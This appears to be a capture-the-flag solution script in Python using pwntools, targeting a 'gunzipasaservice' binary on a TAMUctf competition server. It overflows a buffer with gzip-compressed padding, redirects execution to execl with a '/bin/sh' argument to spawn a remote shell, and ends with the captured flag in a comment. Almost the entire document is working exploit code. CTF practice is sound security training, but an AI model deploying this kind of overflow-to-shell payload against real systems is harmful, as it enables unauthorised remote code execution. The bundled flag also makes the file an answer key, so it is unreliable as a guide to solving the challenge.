import subprocess

from pwn import *


def gzip(buf):
    p = subprocess.run("gzip -f", shell=True, input=buf,
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return p.stdout


binpath = './gunzipasaservice'
elf = ELF(binpath)

context.terminal = ['tmux', 'split-w', '-h']

gdbscript = '''
gef
# gets_fd
b *0x080493D3
c
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = process(binpath)
io = remote('challenges.tamuctf.com', 4709)

payload = b''
payload += b'A' * 0x418
payload += p32(elf.plt['execl'])
payload += p32(0xdeadbeef)
payload += p32(0x804a00e)  # "/bin/sh"
payload += p32(0x0)
data = gzip(payload)

assert len(data) <= 0x200
io.send(data)

io.interactive()
# gigem{r0p_71m3}
